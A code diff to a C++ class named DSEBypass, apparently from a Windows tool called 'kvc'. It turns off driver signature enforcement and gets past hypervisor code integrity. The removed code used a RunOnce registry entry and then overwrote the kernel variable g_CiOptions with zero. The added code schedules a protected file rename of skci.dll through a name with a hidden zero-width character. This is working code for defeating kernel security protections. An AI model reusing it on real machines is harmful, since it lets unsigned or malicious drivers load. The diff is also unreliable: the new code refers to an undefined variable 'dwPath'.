@@ -398,170 +398,58 @@ bool DSEBypass::RestoreSkciLibrary() noexcept {
     return true;
 }
 
-bool DSEBypass::CreateRunOnceEntry() noexcept {
-    DEBUG(L"Creating RunOnce registry entry");
+bool DSEBypass::CreatePendingFileRename() noexcept {
+    DEBUG(L"Creating PendingFileRenameOperations for skci.dll restore");
     
-    HKEY hKey;
-    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, 
-                      L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
-                      0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
-        ERROR(L"Failed to open RunOnce key");
+    wchar_t sysDir[MAX_PATH];
+    if (GetSystemDirectoryW(sysDir, MAX_PATH) == 0) {
+        ERROR(L"Failed to get System32 directory");
         return false;
     }
     
-    wchar_t sysDir[MAX_PATH];
-    GetSystemDirectoryW(sysDir, MAX_PATH);
+    std::wstring srcPath = std::wstring(L"\\??\\") + sysDir + L"\\skci\u200B.dll";
+    std::wstring dstPath = std::wstring(L"\\??\\") + sysDir + L"\\skci.dll";
     
-    std::wstring cmdLine = std::wstring(sysDir) + L"\\kvc.exe dse off";
+    // Prepare Multi-String array (source, destination, empty terminator)
+    std::vector<wchar_t> multiString;
+    multiString.insert(multiString.end(), srcPath.begin(), srcPath.end());
+    multiString.push_back(L'\0');
+    multiString.insert(multiString.end(), dstPath.begin(), dstPath.end());
+    multiString.push_back(L'\0');
+    multiString.push_back(L'\0'); // REG_MULTI_SZ terminator
     
-    LONG result = RegSetValueExW(hKey, L"DisableDSE", 0, REG_SZ,
-                                 reinterpret_cast<const BYTE*>(cmdLine.c_str()),
-                                 static_cast<DWORD>((cmdLine.length() + 1) * sizeof(wchar_t)));
+    HKEY hKey;
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, 
+                      L"SYSTEM\\CurrentControlSet\\Control\\Session Manager",
+                      0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
+        ERROR(L"Failed to open Session Manager key");
+        return false;
+    }
+    
+    // Set PendingFileRenameOperations
+    LONG result = RegSetValueExW(hKey, L"PendingFileRenameOperations", 0, REG_MULTI_SZ,
+                                 reinterpret_cast<const BYTE*>(multiString.data()),
+                                 static_cast<DWORD>(multiString.size() * sizeof(wchar_t)));
+    
+    if (result != ERROR_SUCCESS) {
+        ERROR(L"Failed to set PendingFileRenameOperations (error: %d)", result);
+        RegCloseKey(hKey);
+        return false;
+    }
+    
+    // Set AllowProtectedRenames flag
+    DWORD allowFlag = 1;
+    result = RegSetValueExW(hKey, L"AllowProtectedRenames", 0, REG_DWORD,
+                           reinterpret_cast<const BYTE*>(&allowFlag), sizeof(DWORD));
     
     RegCloseKey(hKey);
     
     if (result != ERROR_SUCCESS) {
-        ERROR(L"Failed to set RunOnce value (error: %d)", result);
+        ERROR(L"Failed to set AllowProtectedRenames (error: %d)", result);
         return false;
     }
     
-    DEBUG(L"RunOnce entry created: %s", cmdLine.c_str());
-    return true;
-}
-
-bool DSEBypass::SaveDSEState(DWORD originalValue) noexcept {
-    DEBUG(L"Saving state to registry");
-    
-    HKEY hKey;
-    DWORD disposition;
-    
-    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Kvc\\DSE", 0, NULL,
-                        REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, 
-                        &hKey, &disposition) != ERROR_SUCCESS) {
-        ERROR(L"Failed to create registry key");
-        return false;
-    }
-    
-    std::wstring state = L"AwaitingRestore";
-    RegSetValueExW(hKey, L"State", 0, REG_SZ,
-                   reinterpret_cast<const BYTE*>(state.c_str()),
-                   static_cast<DWORD>((state.length() + 1) * sizeof(wchar_t)));
-    
-    RegSetValueExW(hKey, L"OriginalValue", 0, REG_DWORD,
-                   reinterpret_cast<const BYTE*>(&originalValue), sizeof(DWORD));
-    
-    RegCloseKey(hKey);
-    
-    DEBUG(L"State saved: AwaitingRestore, original: 0x%08X", originalValue);
-    return true;
-}
-
-bool DSEBypass::LoadDSEState(std::wstring& outState, DWORD& outOriginalValue) noexcept {
-    HKEY hKey;
-    
-    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Kvc\\DSE", 0, 
-                      KEY_READ, &hKey) != ERROR_SUCCESS) {
-        return false;
-    }
-    
-    wchar_t state[256] = {0};
-    DWORD size = sizeof(state);
-    
-    if (RegQueryValueExW(hKey, L"State", NULL, NULL, 
-                         reinterpret_cast<BYTE*>(state), &size) == ERROR_SUCCESS) {
-        outState = state;
-    }
-    
-    size = sizeof(DWORD);
-    RegQueryValueExW(hKey, L"OriginalValue", NULL, NULL,
-                     reinterpret_cast<BYTE*>(&outOriginalValue), &size);
-    
-    RegCloseKey(hKey);
-    return true;
-}
-
-bool DSEBypass::ClearDSEState() noexcept {
-    DEBUG(L"Clearing state from registry");
-    
-    HKEY hKey;
-    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Kvc", 0, 
-                      KEY_WRITE, &hKey) != ERROR_SUCCESS) {
-        return false;
-    }
-    
-    RegDeleteTreeW(hKey, L"DSE");
-    RegCloseKey(hKey);
-    
-    DEBUG(L"State cleared");
-    return true;
-}
-
-bool DSEBypass::DisableDSEAfterReboot() noexcept {
-    DEBUG(L"Post-reboot DSE disable sequence");
-    
-    std::wstring state;
-    DWORD originalValue;
-    
-    if (!LoadDSEState(state, originalValue)) {
-        ERROR(L"No pending DSE state found in registry");
-        return false;
-    }
-    
-    if (state != L"AwaitingRestore") {
-        ERROR(L"Invalid state: %s", state.c_str());
-        return false;
-    }
-    
-    INFO(L"Found pending DSE bypass (original value: 0x%08X)", originalValue);
-    
-    // Step 1: Restore skci.dll
-    if (!RestoreSkciLibrary()) {
-        ERROR(L"Failed to restore skci.dll");
-        return false;
-    }
-    
-    // Step 2: Now patch g_CiOptions (HVCI no longer protects memory)
-    auto ciBase = GetKernelModuleBase("ci.dll");
-    if (!ciBase) {
-        ERROR(L"Failed to locate ci.dll");
-        return false;
-    }
-    
-    m_ciOptionsAddr = FindCiOptions(ciBase.value());
-    if (!m_ciOptionsAddr) {
-        ERROR(L"Failed to locate g_CiOptions");
-        return false;
-    }
-    
-    auto current = m_rtc->Read32(m_ciOptionsAddr);
-    if (!current) {
-        ERROR(L"Failed to read g_CiOptions");
-        return false;
-    }
-    
-    DWORD currentValue = current.value();
-    DEBUG(L"Current g_CiOptions: 0x%08X", currentValue);
-    
-    // Patch to 0x00000000
-    DWORD newValue = 0x00000000;
-    
-    if (!m_rtc->Write32(m_ciOptionsAddr, newValue)) {
-        ERROR(L"Failed to write g_CiOptions");
-        return false;
-    }
-    
-    auto verify = m_rtc->Read32(m_ciOptionsAddr);
-    if (!verify || verify.value() != newValue) {
-        ERROR(L"Verification failed (expected: 0x%08X, got: 0x%08X)",
-              newValue, verify ? verify.value() : 0xFFFFFFFF);
-        return false;
-    }
-    
-    // Step 3: Cleanup
-    ClearDSEState();
-    
-    SUCCESS(L"Driver signature enforcement is off (0x%08X -> 0x%08X)", currentValue, newValue);
-    SUCCESS(L"Hypervisor bypassed and library restored");
-    
+    DEBUG(L"PendingFileRenameOperations configured: %s -> %s", srcPath.c_str(), dwPath.c_str());
+    SUCCESS(L"File restore will be performed automatically by Windows on next boot");
     return true;
 }
